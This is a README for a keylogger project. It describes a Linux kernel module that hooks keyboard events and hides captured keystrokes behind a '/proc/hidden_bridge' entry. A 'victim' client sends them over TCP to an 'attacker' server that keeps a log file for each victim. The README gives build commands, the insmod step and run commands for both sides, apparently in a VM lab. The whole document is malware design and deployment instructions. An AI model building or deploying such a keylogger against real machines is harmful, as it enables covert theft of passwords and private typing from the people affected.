# keylogger

A Linux kernel module that logs keystrokes into `/proc`, a TCP client that forwards them to a remote server, and a multi-threaded server that writes log files per victim.

---

## Overview

- **Kernel module (`keylogger.c`)**
  - Hooks the Linux keyboard notifier to capture key presses.
  - Stores printable ASCII characters in an internal buffer.
  - Exposes the buffer via `/proc/hidden_bridge`.
  - Each read from `/proc/hidden_bridge` returns the current keystrokes and clears the buffer.

- **Victim client (`client.c`)**
  - Reads from `/proc/hidden_bridge` in a loop.
  - Sends any captured keystrokes to a remote TCP server.
  - Supports `-ip` and `-port` command-line arguments.

- **Attacker server (`server.c`)**
  - Listens for incoming client connections.
  - Spawns a thread per client.
  - Writes each client’s stream to its own log file under `logs/`.

---

## Build

### Attacker (server)

```bash
gcc server.c -o server -pthread
```

### Victim (client + kernel module)

```bash
gcc client.c -o client
make
```

---

## Run: one attacker VM + multiple victim VMs

### On attacker VM

```bash
gcc server.c -o server -pthread
./server -port 8080
```

### On each victim VM

```bash
make
gcc client.c -o client

sudo insmod keylogger.ko
./client -ip 192.168.99.10 -port 8080
```

Replace `192.168.99.10` with the attacker VM’s IP on the internal network.

For each connected victim, the server will create a unique log file with their keystrokes.

## Cleanup

On each victim:

```bash
sudo rmmod keylogger.ko
make clean
```

Stop the server with `Ctrl+C` on the attacker.

---


## Run: single VM (two terminals)

### Terminal 1 – server

```bash
./server -port 8080
```

### Terminal 2 – victim

```bash
sudo insmod keylogger.ko
./client -ip 127.0.0.1 -port 8080
```

Type on the victim machine. Keystrokes should appear in the server terminal and be saved under `logs/`.

---